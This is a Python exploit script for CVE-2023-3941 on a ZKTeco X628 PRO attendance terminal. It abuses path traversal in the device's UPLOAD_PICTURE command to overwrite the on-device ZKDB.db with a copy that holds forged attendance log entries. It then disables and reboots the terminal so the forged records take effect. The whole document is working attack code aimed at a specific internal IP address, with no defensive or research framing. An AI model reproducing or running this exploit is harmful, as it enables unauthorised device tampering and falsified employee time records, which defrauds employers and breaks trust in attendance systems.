#!/usr/bin/env python3
"""
CVE-2023-3941 EXPLOIT for X628 PRO FW 6.60.
REMOTELY inject ATTLOG records by overwriting ZKDB.db via UPLOAD_PICTURE 0x272B.
"""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, sqlite3, os, gzip, tarfile, shutil
from datetime import datetime
from zk import ZK, const
from struct import pack, unpack

DEVICE_IP = '172.16.0.214'
SOURCE_ZKDB = 'D:\\chamcong\\zk_fw_attempts\\business_extracted\\000_ZKDB.db'
TEMP_DIR = 'D:\\chamcong\\zk_inject_temp'

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def upload_file_via_picture(conn, target_path, data):
    """
    CVE-2023-3941: UPLOAD_PICTURE (0x272B) with path traversal.
    Filename contains .. to traverse to /mnt/mtdblock/data/<target_path>.
    """
    # Build traversal filename
    parts = target_path.split('/')
    traversal = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "/".join(parts)
    filename = traversal.encode() + b'\x00'

    size = len(data)

    # Step 1: PREPARE_DATA
    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    if not r1.get('status'):
        return {'error': 'PREPARE_DATA failed', 'result': r1}

    # Step 2: Send data chunks
    MAX_CHUNK = 1024
    remain = size % MAX_CHUNK
    packets = (size - remain) // MAX_CHUNK
    for i in range(packets):
        r = send_cmd(conn, const.CMD_DATA, data[i*MAX_CHUNK:(i+1)*MAX_CHUNK])
        if not r.get('status'):
            return {'error': 'DATA chunk {} failed'.format(i), 'result': r}
    if remain:
        r = send_cmd(conn, const.CMD_DATA, data[packets*MAX_CHUNK:])
        if not r.get('status'):
            return {'error': 'DATA remain chunk failed', 'result': r}

    # Step 3: UPLOAD_PICTURE with filename
    r3 = send_cmd(conn, 0x272B, filename)
    return {'PREPARE': r1, 'UPLOAD': r3}

def inject_attlog(source_db, pin, timestamp_iso, status=0, verify_mode=1, work_code=0):
    """Inject a single ATTLOG record into the SQLite copy."""
    conn = sqlite3.connect(source_db)
    cur = conn.cursor()
    cur.execute('''INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                (str(pin), verify_mode, timestamp_iso, status, work_code, 0, 0, None, None, 0))
    conn.commit()
    # Get count
    cur.execute('SELECT COUNT(*) FROM ATT_LOG')
    new_count = cur.fetchone()[0]
    conn.close()
    return new_count

def main():
    print('=' * 60)
    print('CVE-2023-3941 ATTLOG REMOTE INJECTION')
    print('=' * 60)
    print('Target: {} (X628 PRO FW 6.60)'.format(DEVICE_IP))
    print('Source ZKDB: {}'.format(SOURCE_ZKDB))

    if not os.path.exists(SOURCE_ZKDB):
        print('[!] Source ZKDB not found')
        return

    # Step 1: Make working copy
    os.makedirs(TEMP_DIR, exist_ok=True)
    work_db = os.path.join(TEMP_DIR, 'modified.db')
    shutil.copy(SOURCE_ZKDB, work_db)

    # Get original count
    conn = sqlite3.connect(SOURCE_ZKDB)
    cur = conn.cursor()
    cur.execute('SELECT COUNT(*) FROM ATT_LOG')
    orig_count = cur.fetchone()[0]
    conn.close()
    print('[*] Original ATT_LOG count: {}'.format(orig_count))

    # Step 2: Inject test record
    pin = input('Enter PIN to inject (default 1): ').strip() or '1'
    timestamp = input('Enter timestamp ISO format (default now): ').strip()
    if not timestamp:
        timestamp = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')

    new_count = inject_attlog(work_db, pin, timestamp)
    print('[*] New ATT_LOG count: {}'.format(new_count))

    # Step 3: Read modified DB
    with open(work_db, 'rb') as f:
        modified_data = f.read()
    print('[*] Modified DB size: {} bytes'.format(len(modified_data)))

    # Step 4: Connect to device
    print('\n[*] Connecting to {}...'.format(DEVICE_IP))
    zk = ZK(DEVICE_IP, port=4370, timeout=15, password=0)
    try:
        conn = zk.connect()
    except Exception as e:
        print('[!] Connect failed:', e)
        return

    print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

    try:
        conn.disable_device()
        print('[+] Device disabled')
    except: pass

    # Step 5: Upload via CVE-2023-3941 (UPLOAD_PICTURE path traversal)
    print('\n[*] Uploading modified ZKDB.db via CVE-2023-3941...')
    result = upload_file_via_picture(conn, 'mnt/mtdblock/data/ZKDB.db', modified_data)
    print('  Result:', result)

    # Step 6: Verify file written
    time.sleep(2)
    print('\n[*] Verifying file written...')
    r = send_cmd(conn, 0x6A6, b'/mnt/mtdblock/data/ZKDB.db\x00')
    print('  READFILE ZKDB.db: code=0x{:04X}'.format(r.get('code', 0) or 0))

    # Step 7: Reboot device to load new ZKDB.db
    print('\n[*] Rebooting device...')
    try:
        conn.restart()
        print('  [+] Restart command sent')
    except Exception as e:
        print('  [!] Restart:', e)

    try:
        conn.enable_device()
    except: pass
    try:
        conn.disconnect()
    except: pass
    print('\n[+] Done')

if __name__ == '__main__':
    main()
